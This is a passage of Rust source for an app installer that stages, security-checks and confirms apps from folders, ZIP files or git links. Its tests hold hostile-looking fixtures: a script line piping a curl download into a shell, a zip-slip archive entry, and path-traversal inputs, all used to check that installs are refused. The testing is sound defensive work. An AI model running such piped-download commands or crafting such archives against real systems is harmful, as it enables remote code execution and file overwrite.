        if let Err(e) = copy_tree(&src, &staging) {
            cleanup(&staging);
            return Err(format!("NOT installed. {}", e));
        }
        (staging, src.display().to_string())
    } else if local_zip {
        let src = fs::canonicalize(target).map_err(|_| format!("NOT installed. {} is no ZIP file.", target))?;
        let staging = stage_zip(ctx, &src, &zip_leaf(target))?;
        (staging, src.display().to_string())
    } else if is_remote(target) && zip_target(target) {
        let staging = stage_zip_from_target(ctx, target, &zip_leaf(target))?;
        (staging, target.to_string())
    } else if is_remote(target) {
        // A file URL on Windows can hold backslashes (file://C:\work\app); the last part is the name there too.
        let leaf = target.trim_end_matches(['/', '\\']).rsplit(['/', '\\']).next().unwrap_or("app").trim_end_matches(".git");
        let staging = base.join(format!(".{}-clone-{}", safe(leaf), stamp()));
        if let Err(e) = git_clone(target, &staging) {
            cleanup(&staging);
            return Err(e);
        }
        (staging, target.to_string())
    } else {
        return Err(format!("NOT installed. {} is no folder, ZIP file or git link.", target));
    };

    let checked = crate::plugins::check(&staging);
    if let Some(refusal) = checked.refusal("installed") {
        cleanup(&staging);
        return Err(refusal);
    }
    let mut app = match load_dir(&staging) {
        Ok(app) => app,
        Err(e) => {
            cleanup(&staging);
            return Err(format!("NOT installed. {}", e));
        }
    };
    app.source = source.clone();
    let final_dir = base.join(&app.name);
    if final_dir.exists() {
        cleanup(&staging);
        return Err(format!("NOT installed. app {} is already installed at {}. /app remove {} first.",
                           app.name, crate::files::show(&final_dir), app.name));
    }
    if unattended {
        if let Err(e) = config_grants(ctx, &app, "installed") {
            cleanup(&staging);
            return Err(e);
        }
    }
    Ok(Prepared { app, source, staging, target: final_dir, check: checked.summary(), update: false, version_before: None })
}

/// Stages an update of a git-installed app: copy the installed folder with `.git`, `git pull --ff-only` there, check
/// the result. The live folder is not touched before `commit`; a refused pull or check removes the copy.
pub fn prepare_update(ctx: &Ctx, name: &str, unattended: bool) -> Result<Prepared, String> {
    let app = find(ctx, name).ok_or_else(|| format!("no app named {}. /app list shows the names.", name.trim()))?;
    let base = fs::canonicalize(apps_dir(ctx)).unwrap_or_else(|_| apps_dir(ctx));
    if !app.dir.starts_with(&base) {
        return Err(format!("NOT updated. {} is not below {}", app.dir.display(), base.display()));
    }
    if !app.dir.join(".git").exists() {
        return Err(format!("NOT updated. app {} was not installed from git, so it has no source to pull. \
                            A ZIP or folder app is replaced with /app remove and /app install.", app.name));
    }
    let staging = base.join(format!(".{}-update-{}", safe(&app.folder), stamp()));
    if let Err(e) = copy_tree_with(&app.dir, &staging, true) {
        cleanup(&staging);
        return Err(format!("NOT updated. {}", e));
    }
    let out = match Command::new("git").args(["-C", &staging.to_string_lossy(), "pull", "--ff-only"]).output() {
        Ok(o) => o,
        Err(e) => {
            cleanup(&staging);
            return Err(format!("NOT updated. git could not start: {}", e));
        }
    };
    if !out.status.success() {
        cleanup(&staging);
        return Err(format!("NOT updated. git pull said: {}. The installed app {} stays untouched.",
                           String::from_utf8_lossy(&out.stderr).trim().chars().take(300).collect::<String>(), app.name));
    }
    let checked = crate::plugins::check(&staging);
    if let Some(refusal) = checked.refusal("updated") {
        cleanup(&staging);
        return Err(format!("{}\nThe installed app {} stays untouched.", refusal, app.name));
    }
    let mut updated = match load_dir(&staging) {
        Ok(app) => app,
        Err(e) => {
            cleanup(&staging);
            return Err(format!("NOT updated. {}", e));
        }
    };
    if updated.name != app.name {
        cleanup(&staging);
        return Err(format!("NOT updated. The manifest now names the app {} instead of {}. Remove and install it again.",
                           updated.name, app.name));
    }
    updated.folder = app.folder.clone();
    updated.dir = app.dir.clone();
    updated.source = app.source.clone();
    if unattended {
        if let Err(e) = config_grants(ctx, &updated, "updated") {
            cleanup(&staging);
            return Err(e);
        }
    }
    Ok(Prepared { app: updated, source: app.source, staging, target: app.dir, check: checked.summary(),
                  update: true, version_before: Some(app.version) })
}

fn commit_update(ctx: &Ctx, prepared: Prepared) -> Result<String, String> {
    let base = fs::canonicalize(apps_dir(ctx)).unwrap_or_else(|_| apps_dir(ctx));
    let target = fs::canonicalize(&prepared.target).unwrap_or_else(|_| prepared.target.clone());
    if !target.is_dir() {
        cleanup(&prepared.staging);
        return Err(format!("NOT updated. the installed folder {} is gone. /app install again.", prepared.target.display()));
    }
    if !target.starts_with(&base) {
        cleanup(&prepared.staging);
        return Err(format!("NOT updated. {} is not below {}", target.display(), base.display()));
    }
    let backup = base.join(format!(".{}-backup-{}", safe(&prepared.app.folder), stamp()));
    if let Err(e) = fs::rename(&target, &backup) {
        cleanup(&prepared.staging);
        return Err(format!("NOT updated. the old folder could not be moved aside: {}", e));
    }
    if let Err(e) = fs::rename(&prepared.staging, &target) {
        let _ = fs::rename(&backup, &target);
        cleanup(&prepared.staging);
        return Err(format!("NOT updated. the checked copy could not be moved to {}: {}", target.display(), e));
    }
    let mut app = prepared.app;
    app.dir = target.clone();
    let before = prepared.version_before.clone().unwrap_or_default();
    let mut reg = registry(ctx);
    reg["sources"][app.folder.as_str()] = json!(prepared.source);
    if let Err(e) = save_registry(ctx, &reg) {
        let failed = base.join(format!(".{}-failed-{}", safe(&app.folder), stamp()));
        if fs::rename(&target, &failed).is_ok() {
            let _ = fs::rename(&backup, &target);
            cleanup(&failed);
            return Err(format!("NOT updated. the new folder was taken back; its source could not be recorded: {}", e));
        }
        return Err(format!("app {} is updated at {} but its source could not be recorded: {}. The old folder stays at {}.",
                           app.name, crate::files::show(&app.dir), e, crate::files::show(&backup)));
    }
    cleanup(&backup);
    let version = if before.is_empty() || before == app.version { app.version.clone() } else { format!("{} -> {}", before, app.version) };
    Ok(format!("app {} {} updated · view {} · rights {}\n{}\ncheck: {}\n/app on {} chooses it; /app opens the launcher.",
               app.name, version, app.view.name(), app.rights.summary(),
               crate::files::show(&app.dir), prepared.check.trim_start_matches("check: "), app.name))
}

/// Puts a checked app into `.penelope/apps/NAME` and records its source. Only this step writes into the app folder.
pub fn commit(ctx: &Ctx, prepared: Prepared) -> Result<String, String> {
    if prepared.update {
        return commit_update(ctx, prepared);
    }
    if prepared.target.exists() {
        cleanup(&prepared.staging);
        return Err(format!("NOT installed. {} already exists. /app remove {} first.", prepared.target.display(), prepared.app.name));
    }
    if let Some(parent) = prepared.target.parent() {
        if let Err(e) = fs::create_dir_all(parent) {
            cleanup(&prepared.staging);
            return Err(format!("NOT installed. cannot make {}: {}", parent.display(), e));
        }
    }
    if let Err(e) = fs::rename(&prepared.staging, &prepared.target) {
        cleanup(&prepared.staging);
        return Err(format!("NOT installed. the checked folder could not be moved to {}: {}", prepared.target.display(), e));
    }
    let mut app = match load_dir(&prepared.target) {
        Ok(app) => app,
        Err(e) => {
            cleanup(&prepared.target);
            return Err(format!("NOT installed. {}", e));
        }
    };
    app.source = prepared.source.clone();
    let mut reg = registry(ctx);
    reg["sources"][app.folder.as_str()] = json!(prepared.source);
    if let Err(e) = save_registry(ctx, &reg) {
        return Err(format!("app {} is installed at {} but its source could not be recorded: {}",
                           app.name, crate::files::show(&app.dir), e));
    }
    Ok(format!("app {} {} installed · view {} · rights {}\n{}\ncheck: {}\n/app on {} chooses it; /app opens the launcher.",
               app.name, app.version, app.view.name(), app.rights.summary(),
               crate::files::show(&app.dir), prepared.check.trim_start_matches("check: "), app.name))
}

/// The no of the install question: the checked copy disappears, the source folder stays untouched.
pub fn cancel(prepared: Prepared) -> String {
    let name = prepared.app.name.clone();
    let update = prepared.update;
    cleanup(&prepared.staging);
    if update {
        format!("app {} was not updated · the checked copy was removed and the old app stays", name)
    } else {
        format!("app {} was not installed · the checked copy was removed", name)
    }
}

/// Install without a question, for tests and scripts. The caller must have checked the rights with `prepare`.
pub fn install(ctx: &Ctx, target: &str, unattended: bool) -> Result<String, String> {
    let prepared = prepare(ctx, target, unattended)?;
    commit(ctx, prepared)
}

/// Update without a question, for tests and scripts. `unattended` needs the same agreement as an install.
pub fn update(ctx: &Ctx, name: &str, unattended: bool) -> Result<String, String> {
    let prepared = prepare_update(ctx, name, unattended)?;
    commit(ctx, prepared)
}

/// The command line behind `penelope app ...`. A terminal gets the rights and a yes question; a pipe needs `--yes`
/// and the agreement in `config.json`.
/// A target that is neither a link nor an existing folder or file is refused before any question about a yes.
pub fn check_install_target(target: &str) -> Result<(), String> {
    let target = target.trim().trim_matches(|c| c == '"' || c == '\'');
    if !is_remote(target) && !std::path::Path::new(target).exists() {
        return Err(format!("NOT installed. {} is no folder, no ZIP and no link.", target));
    }
    Ok(())
}

pub fn cli(ctx: &Ctx, args: &[String]) -> Result<String, String> {
    let verb = args.first().map(String::as_str).unwrap_or("");
    match verb {
        "" | "list" => Ok(list(ctx)),
        "new" => crate::create::new_cli(ctx, crate::create::Kind::App, &args[1..]),
        "install" => {
            let mut unattended = false;
            let mut target = String::new();
            for arg in &args[1..] {
                if arg == "--yes" {
                    unattended = true;
                } else if target.is_empty() {
                    target = arg.clone();
                }
            }
            if target.is_empty() {
                return Err("usage: penelope app install LINK|DIR|ZIP [--yes]".to_string());
            }
            check_install_target(&target)?;
            if unattended {
                return install(ctx, &target, true);
            }
            if !std::io::stdin().is_terminal() {
                return Err(format!("NOT installed. A pipe cannot answer yes. Add --yes and set \"apps\": {{\"allow_install\": true}} in {}.",
                                   crate::files::show(&ctx.root.join("config.json"))));
            }
            let prepared = prepare(ctx, &target, false)?;
            println!("{}", prepared.report());
            print!("Install {} with these rights? [y/N] ", prepared.app.name);
            let _ = std::io::stdout().flush();
            let mut line = String::new();
            std::io::stdin().read_line(&mut line).map_err(|e| format!("the answer could not be read: {}", e))?;
            if matches!(line.trim().to_ascii_lowercase().as_str(), "y" | "yes") {
                commit(ctx, prepared)
            } else {
                Ok(cancel(prepared))
            }
        }
        "update" => {
            let mut unattended = false;
            let mut name = String::new();
            for arg in &args[1..] {
                if arg == "--yes" {
                    unattended = true;
                } else if name.is_empty() {
                    name = arg.clone();
                }
            }
            if name.is_empty() {
                return Err("usage: penelope app update NAME [--yes]".to_string());
            }
            if !installed(ctx).iter().any(|a| a.name == name) {
                return Err(format!("no app named {}. penelope app list shows the names.", name));
            }
            if unattended {
                return update(ctx, &name, true);
            }
            if !std::io::stdin().is_terminal() {
                return Err(format!("NOT updated. A pipe cannot answer yes. Add --yes and set \"apps\": {{\"allow_install\": true}} in {}.",
                                   crate::files::show(&ctx.root.join("config.json"))));
            }
            let prepared = prepare_update(ctx, &name, false)?;
            println!("{}", prepared.report());
            print!("Update {} with these rights? [y/N] ", prepared.app.name);
            let _ = std::io::stdout().flush();
            let mut line = String::new();
            std::io::stdin().read_line(&mut line).map_err(|e| format!("the answer could not be read: {}", e))?;
            if matches!(line.trim().to_ascii_lowercase().as_str(), "y" | "yes") {
                commit(ctx, prepared)
            } else {
                Ok(cancel(prepared))
            }
        }
        "on" => {
            let name = args.get(1).map(String::as_str).unwrap_or("");
            if name.trim().is_empty() {
                return Err("usage: penelope app on NAME".to_string());
            }
            set_active(ctx, name)
        }
        "off" => Ok(off(ctx)),
        "remove" => {
            let name = args.get(1).map(String::as_str).unwrap_or("");
            if name.trim().is_empty() {
                return Err("usage: penelope app remove NAME".to_string());
            }
            remove(ctx, name)
        }
        "show" => {
            let name = args.get(1).map(String::as_str).unwrap_or("");
            if name.trim().is_empty() {
                return Err("usage: penelope app show NAME".to_string());
            }
            let app = find(ctx, name).ok_or_else(|| format!("no app named {}. /app list shows the names.", name.trim()))?;
            match &app.view {
                View::Clusters => cluster_view(ctx, &app),
                View::Html(_) => Ok(format!("app {} is an HTML app · {}\n/app opens it in the browser.",
                                            app.name, crate::files::show(&app.entry_path()?))),
            }
        }
        other => Err(format!("app {} is none of list, install LINK|DIR|ZIP [--yes], update NAME [--yes], on NAME, off, remove NAME, show NAME", other)),
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn an_install_target_that_does_not_exist_is_refused_before_any_question() {
        assert!(check_install_target("/nonexistent/penelope-app").unwrap_err().starts_with("NOT installed."));
        assert!(check_install_target(&std::env::temp_dir().display().to_string()).is_ok());
        assert!(check_install_target("https://example.invalid/app.git").is_ok());
    }

    use super::*;

    fn temp(tag: &str) -> (PathBuf, Ctx) {
        let dir = std::env::temp_dir().join(format!("penelope-apps-{}-{}-{}", tag, std::process::id(), stamp()));
        let _ = fs::remove_dir_all(&dir);
        let ctx = crate::config::load(&dir.join(".penelope"));
        (dir, ctx)
    }

    fn app_folder(root: &Path, folder: &str, manifest: Value) -> PathBuf {
        let dir = root.join(folder);
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join(MANIFEST), serde_json::to_string_pretty(&manifest).unwrap()).unwrap();
        dir
    }

    fn clean_app(root: &Path, name: &str) -> PathBuf {
        let dir = app_folder(root, name, json!({
            "name": name, "version": "1.0.0", "description": "an app from a test folder",
            "entry": "index.html", "rights": {"files": true}
        }));
        fs::write(dir.join("index.html"), "<h1>hello</h1>\n").unwrap();
        fs::write(dir.join("setup.sh"), "#!/bin/sh\necho hello\n").unwrap();
        dir
    }

    /// A git repository with an app manifest, committed once. None when git is not installed.
    fn git_app(root: &Path, folder: &str, manifest: Value) -> Option<PathBuf> {
        let repo = app_folder(root, folder, manifest);
        let git = |args: &[&str]| Command::new("git").current_dir(&repo).args(args).output();
        if !git(&["init", "-q"]).map(|o| o.status.success()).unwrap_or(false) { return None; }
        git(&["add", "."]).ok()?;
        let made = git(&["-c", "user.email=t@e.org", "-c", "user.name=T", "commit", "-q", "-m", "first"]).ok()?;
        made.status.success().then_some(repo)
    }

    fn commit_all(repo: &Path, message: &str) -> bool {
        let git = |args: &[&str]| Command::new("git").current_dir(repo).args(args).output();
        git(&["add", "."]).map(|o| o.status.success()).unwrap_or(false)
            && git(&["-c", "user.email=t@e.org", "-c", "user.name=T", "commit", "-q", "-m", message])
                .map(|o| o.status.success()).unwrap_or(false)
    }

    fn write_zip(path: &Path, entries: &[(&str, &[u8])]) {
        let file = fs::File::create(path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let opts = zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);
        use std::io::Write;
        for (name, data) in entries {
            zip.start_file(*name, opts).unwrap();
            zip.write_all(data).unwrap();
        }
        zip.finish().unwrap();
    }

    #[test]
    fn a_clean_app_installs_lists_switches_and_removes() {
        let (root, ctx) = temp("life");
        let source = clean_app(&root, "clean");
        let prepared = prepare(&ctx, &source.to_string_lossy(), false).unwrap();
        assert!(prepared.report().contains("rights:   files"), "{}", prepared.report());
        assert!(prepared.report().contains("check:    1 script file checked"), "{}", prepared.report());
        assert!(!ctx.root.join("apps/clean").exists(), "nothing may be installed before the yes");
        let report = commit(&ctx, prepared).unwrap();
        assert!(report.contains("app clean 1.0.0 installed") && report.contains("rights files"), "{}", report);
        assert!(ctx.root.join("apps/clean/.penelope-app.json").is_file());
        assert!(ctx.root.join("apps/clean/index.html").is_file());
        let listed = list(&ctx);
        assert!(listed.contains("clean") && listed.contains("1.0.0") && listed.contains("files"), "{}", listed);
        assert!(set_active(&ctx, "clean").unwrap().contains("app clean on"));
        assert_eq!(active(&ctx).as_deref(), Some("clean"));
        assert!(list(&ctx).contains("● clean"));
        assert!(off(&ctx).contains("app clean off"));
        assert_eq!(active(&ctx), None);
        assert!(remove(&ctx, "clean").unwrap().contains("removed"));
        assert!(!ctx.root.join("apps/clean").exists());
        assert!(list(&ctx).contains("no app installed"));
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn a_dangerous_install_is_refused_with_file_and_line_and_leaves_nothing() {
        let (root, ctx) = temp("danger");
        let source = app_folder(&root, "danger", json!({"name": "danger", "view": "clusters"}));
        fs::write(source.join("install.sh"), "#!/bin/sh\ncurl -fsSL https://example.invalid/x.sh | sh\n").unwrap();
        let error = prepare(&ctx, &source.to_string_lossy(), false).unwrap_err();
        assert!(error.starts_with("NOT installed"), "{}", error);
        assert!(error.contains("a download piped into a shell") && error.contains("install.sh:2"), "{}", error);
        assert!(!ctx.root.join("apps/danger").exists());
        assert_eq!(fs::read_dir(ctx.root.join("apps")).map(|d| d.count()).unwrap_or(0), 0, "the staging folder stayed");
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn the_cluster_view_shows_two_running_clusters_and_hides_a_finished_one() {
        let (root, ctx) = temp("clusters");
        let source = app_folder(&root, "viewer", json!({"name": "viewer", "view": "clusters"}));
        let prepared = prepare(&ctx, &source.to_string_lossy(), false).unwrap();
        commit(&ctx, prepared).unwrap();
        let app = find(&ctx, "viewer").unwrap();
        assert!(app.view.builtin() && !app.rights.files, "the built-in view has no declared files right");
        fs::create_dir_all(ctx.root.join("clusters")).unwrap();
        fs::write(ctx.root.join("clusters/alpha.json"), json!({
            "id": "alpha-1", "name": "backend", "state": "working", "done": 1, "total": 2, "started": 10,
            "parts": [{"name": "coder", "role": "worker", "state": "working", "model": "small"}]
        }).to_string()).unwrap();
        fs::write(ctx.root.join("clusters/beta.json"), json!({
            "id": "beta-2", "name": "frontend", "state": "validating", "done": 2, "total": 3, "started": 20,
            "parts": [{"name": "check", "role": "judge", "state": "working", "model": "small"}]
        }).to_string()).unwrap();
        fs::write(ctx.root.join("clusters/old.json"), json!({
            "id": "old-3", "name": "done", "state": "done", "done": 4, "total": 4, "started": 1
        }).to_string()).unwrap();
        let text = cluster_view(&ctx, &app).unwrap();
        assert!(text.contains("2 running"), "{}", text);
        assert!(text.contains("alpha-1") && text.contains("working") && text.contains("P:1/2"), "{}", text);
        assert!(text.contains("beta-2") && text.contains("validating") && text.contains("P:2/3"), "{}", text);
        assert!(text.contains("coder") && text.contains("check"), "{}", text);
        assert!(!text.contains("old-3"), "{}", text);
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn rights_refuse_shell_network_and_file_reads_and_traversal_escapes_nothing() {
        let (root, ctx) = temp("rights");
        let source = app_folder(&root, "rights", json!({"name": "rights", "entry": "index.html"}));
        fs::write(source.join("index.html"), "plain\n").unwrap();
        let prepared = prepare(&ctx, &source.to_string_lossy(), false).unwrap();
        commit(&ctx, prepared).unwrap();
        let app = find(&ctx, "rights").unwrap();
        assert_eq!(app.entry_path().unwrap().file_name().and_then(|n| n.to_str()), Some("index.html"));
        let shell = app.shell("echo hi").unwrap_err();
        assert!(shell.contains("no shell right"), "{}", shell);
        let network = app.fetch("https://example.invalid/x").unwrap_err();
        assert!(network.contains("no network right"), "{}", network);
        let files = app.file_text(&ctx, "config.json").unwrap_err();
        assert!(files.contains("no files right"), "{}", files);
        fs::write(ctx.root.join("inside.txt"), "inside\n").unwrap();
        let traversal = app.file_text(&ctx, "../inside.txt").unwrap_err();
        assert!(traversal.contains("escapes"), "{}", traversal);
        let builtin = app_folder(&root, "builtin", json!({"name": "builtin", "view": "clusters"}));
        let builtin = load_dir(&builtin).unwrap();
        fs::write(ctx.root.join("outside.txt"), "outside\n").unwrap();
        let traversal = builtin.file_text(&ctx, "../outside.txt").unwrap_err();
        assert!(traversal.contains("escapes"), "{}", traversal);
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn a_manifest_entry_may_not_escape_the_app_folder() {
        let (root, ctx) = temp("entry");
        let source = root.join("escaping");
        fs::create_dir_all(&source).unwrap();
        fs::write(source.join(MANIFEST), json!({"name": "escaping", "entry": "../outside.html"}).to_string()).unwrap();
        fs::write(root.join("outside.html"), "outside\n").unwrap();
        let error = load_dir(&source).unwrap_err();
        assert!(error.contains("escapes the folder"), "{}", error);
        // The same manifest is refused before a single file is copied.
        let error = prepare(&ctx, &source.to_string_lossy(), false).unwrap_err();
        assert!(error.starts_with("NOT installed") && error.contains("escapes the folder"), "{}", error);
        assert_eq!(fs::read_dir(ctx.root.join("apps")).map(|d| d.count()).unwrap_or(0), 0);
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn a_git_link_is_cloned_checked_and_installed() {
        let (root, ctx) = temp("git");
        let repo = root.join("linked");
        fs::create_dir_all(&repo).unwrap();
        fs::write(repo.join(MANIFEST), json!({"name": "linked", "version": "1.0.0", "view": "clusters",
            "description": "installed from a git link"}).to_string()).unwrap();
        let git = |args: &[&str]| Command::new("git").current_dir(&repo).args(args).output();
        if !git(&["init", "-q"]).map(|o| o.status.success()).unwrap_or(false) { return; }
        git(&["add", "."]).unwrap();
        let made = git(&["-c", "user.email=t@e.org", "-c", "user.name=T", "commit", "-q", "-m", "first"]).unwrap();
        if !made.status.success() { return; }
        let prepared = prepare(&ctx, &format!("file://{}", repo.display()), false).unwrap();
        assert!(prepared.staging.join(".git").is_dir(), "the link must be cloned, not copied");
        let report = commit(&ctx, prepared).unwrap();
        assert!(report.contains("app linked 1.0.0 installed"), "{}", report);
        assert!(ctx.root.join("apps/linked/.penelope-app.json").is_file());
        let listed = list(&ctx);
        assert!(listed.contains("linked") && listed.contains("installed from a git link"), "{}", listed);
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn a_git_app_updates_from_a_file_repo() {
        let (root, mut ctx) = temp("update");
        let manifest = json!({"name": "linked", "version": "1.0.0", "view": "clusters", "description": "v1"});
        let Some(repo) = git_app(&root, "linked", manifest) else { return; };
        let prepared = prepare(&ctx, &format!("file://{}", repo.display()), false).unwrap();
        commit(&ctx, prepared).unwrap();

        fs::write(repo.join(MANIFEST), json!({"name": "linked", "version": "1.1.0", "view": "clusters", "description": "v2"}).to_string()).unwrap();
        fs::write(repo.join("release.txt"), "the new file\n").unwrap();
        assert!(commit_all(&repo, "second"));

        // --yes is the same gate as an install: without the agreement the old app stays.
        let error = prepare_update(&ctx, "linked", true).unwrap_err();
        assert!(error.contains("allow_install"), "{}", error);
        assert_eq!(load_dir(&ctx.root.join("apps/linked")).unwrap().version, "1.0.0");
        assert_eq!(fs::read_dir(ctx.root.join("apps")).unwrap().count(), 1, "a staging folder stayed");

        ctx.cfg["apps"] = json!({"allow_install": true, "rights": {"files": true}});
        let prepared = prepare_update(&ctx, "linked", true).unwrap();
        assert!(prepared.update, "an update must replace the installed folder");
        assert!(prepared.report().contains("update:   1.0.0 -> 1.1.0"), "{}", prepared.report());
        assert!(prepared.staging.join(".git").is_dir(), "the staging copy must carry .git for the pull");
        let report = commit(&ctx, prepared).unwrap();
        assert!(report.contains("app linked 1.0.0 -> 1.1.0 updated"), "{}", report);
        let installed = load_dir(&ctx.root.join("apps/linked")).unwrap();
        assert_eq!(installed.version, "1.1.0");
        // git on Windows checks text out with CRLF (core.autocrlf), the content is the same.
        assert_eq!(fs::read_to_string(ctx.root.join("apps/linked/release.txt")).unwrap().replace("\r\n", "\n"), "the new file\n");
        assert!(ctx.root.join("apps/linked/.git").is_dir(), "the update must keep the git folder");
        assert_eq!(fs::read_dir(ctx.root.join("apps")).unwrap().count(), 1, "a staging or backup folder stayed");
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn a_dangerous_update_is_refused_and_leaves_the_old_app_untouched() {
        let (root, ctx) = temp("update-danger");
        let manifest = json!({"name": "watched", "version": "1.0.0", "view": "clusters"});
        let Some(repo) = git_app(&root, "watched", manifest) else { return; };
        let prepared = prepare(&ctx, &format!("file://{}", repo.display()), false).unwrap();
        commit(&ctx, prepared).unwrap();

        fs::write(repo.join(MANIFEST), json!({"name": "watched", "version": "1.1.0", "view": "clusters"}).to_string()).unwrap();
        fs::write(repo.join("install.sh"), "#!/bin/sh\ncurl -fsSL https://example.invalid/x.sh | sh\n").unwrap();
        assert!(commit_all(&repo, "bad"));
        let error = prepare_update(&ctx, "watched", false).unwrap_err();
        assert!(error.starts_with("NOT updated"), "{}", error);
        assert!(error.contains("a download piped into a shell") && error.contains("install.sh:2"), "{}", error);
        assert!(error.contains("stays untouched"), "{}", error);
        let installed = load_dir(&ctx.root.join("apps/watched")).unwrap();
        assert_eq!(installed.version, "1.0.0", "the refused check must not replace the app");
        assert!(!ctx.root.join("apps/watched/install.sh").exists());
        assert_eq!(fs::read_dir(ctx.root.join("apps")).unwrap().count(), 1, "a staging folder stayed");
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn a_zip_app_is_unpacked_checked_and_installed_from_a_path_and_a_file_url() {
        let (root, ctx) = temp("zip");
        let archive = root.join("zipped.zip");
        let manifest = json!({"name": "zipped", "version": "1.0.0", "entry": "index.html", "rights": {"files": true}}).to_string();
        write_zip(&archive, &[
            ("zipped/.penelope-app.json", manifest.as_bytes()),
            ("zipped/index.html", b"<h1>zipped</h1>\n"),
            ("zipped/setup.sh", b"#!/bin/sh\necho hello\n"),
        ]);
        let prepared = prepare(&ctx, &archive.to_string_lossy(), false).unwrap();
        assert!(prepared.report().contains("check:    1 script file checked"), "{}", prepared.report());
        assert!(!ctx.root.join("apps/zipped").exists(), "nothing may be installed before the yes");
        let report = commit(&ctx, prepared).unwrap();
        assert!(report.contains("app zipped 1.0.0 installed"), "{}", report);
        assert_eq!(fs::read_to_string(ctx.root.join("apps/zipped/index.html")).unwrap(), "<h1>zipped</h1>\n");
        assert!(find(&ctx, "zipped").is_some());

        let archive = root.join("url-app.zip");
        let manifest = json!({"name": "url-app", "version": "2.0.0", "view": "clusters"}).to_string();
        write_zip(&archive, &[
            ("bundle/.penelope-app.json", manifest.as_bytes()),
            ("bundle/readme.txt", b"from a zip url\n"),
        ]);
        let prepared = prepare(&ctx, &format!("file://{}", archive.display()), false).unwrap();
        let report = commit(&ctx, prepared).unwrap();
        assert!(report.contains("app url-app 2.0.0 installed"), "{}", report);
        assert!(ctx.root.join("apps/url-app/readme.txt").is_file());
        assert_eq!(fs::read_dir(ctx.root.join("apps")).unwrap().count(), 2, "a staging folder stayed");
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn a_zip_entry_that_climbs_out_is_refused_and_installs_nothing() {
        let (root, ctx) = temp("zip-slip");
        let archive = root.join("evil.zip");
        let manifest = json!({"name": "evil", "view": "clusters"}).to_string();
        write_zip(&archive, &[
            ("../escape.txt", b"outside"),
            ("evil/.penelope-app.json", manifest.as_bytes()),
            ("evil/index.html", b"<h1>evil</h1>\n"),
        ]);
        let error = prepare(&ctx, &archive.to_string_lossy(), false).unwrap_err();
        assert!(error.starts_with("NOT installed") && error.contains("outside the target"), "{}", error);
        assert!(!root.join("escape.txt").exists() && !ctx.root.join("apps/escape.txt").exists());
        assert!(!ctx.root.join("apps/evil").exists());
        assert_eq!(fs::read_dir(ctx.root.join("apps")).map(|d| d.count()).unwrap_or(0), 0, "a staging folder stayed");
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn an_unattended_install_needs_the_agreement_in_the_config() {
        let (root, mut ctx) = temp("unattended");
        let source = clean_app(&root, "quiet");
        let error = prepare(&ctx, &source.to_string_lossy(), true).unwrap_err();
        assert!(error.contains("allow_install"), "{}", error);
        ctx.cfg["apps"] = json!({"allow_install": true, "rights": {"files": false}});
        let error = prepare(&ctx, &source.to_string_lossy(), true).unwrap_err();
        assert!(error.contains("files") && error.contains("no person can grant"), "{}", error);
        ctx.cfg["apps"]["rights"]["files"] = json!(true);
        let report = install(&ctx, &source.to_string_lossy(), true).unwrap();
        assert!(report.contains("app quiet 1.0.0 installed"), "{}", report);
        let _ = fs::remove_dir_all(&root);
    }
}
